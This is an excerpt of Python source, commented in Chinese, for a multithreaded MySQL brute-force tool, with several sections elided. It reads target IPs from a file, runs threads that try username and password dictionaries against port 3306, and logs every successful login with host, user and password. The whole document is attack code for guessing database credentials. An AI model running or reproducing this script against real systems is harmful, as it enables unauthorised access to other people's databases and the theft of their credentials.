...
def thread_mysql():   #线程
    ...
    while True:
        ...
        try:
            mysql = pymysql.connect(host=host, port=3306, user=user, passwd=password, db='mysql')
            lock.acquire()  # 加锁

            login.append("[*] mysql成功 host:%s --> user:%s --> pass:%s" % (host, user, password))
            succlog.write("[*] mysql成功 host:%s --> user:%s --> pass:%s\n" % (host, user, password))
...
def brute_mysql(ip,user_dict,pass_dict,thread_count):  #ip地址(列表)，账号文件，密码文件，线程数
    thread = []
    ...
    for i in range(thread_count):
        f = threading.Thread(target=thread_mysql)
        f.start()
        thread.append(f)
    for i in thread:
        i.join()
...
def main():    #填写配置 和 处理ip
    ...
    with open('ip.txt','r') as f:
        ...
        for line in lines:
            line=line.strip()
            brute_mysql(line, user_dict, pass_dict, thread_count)
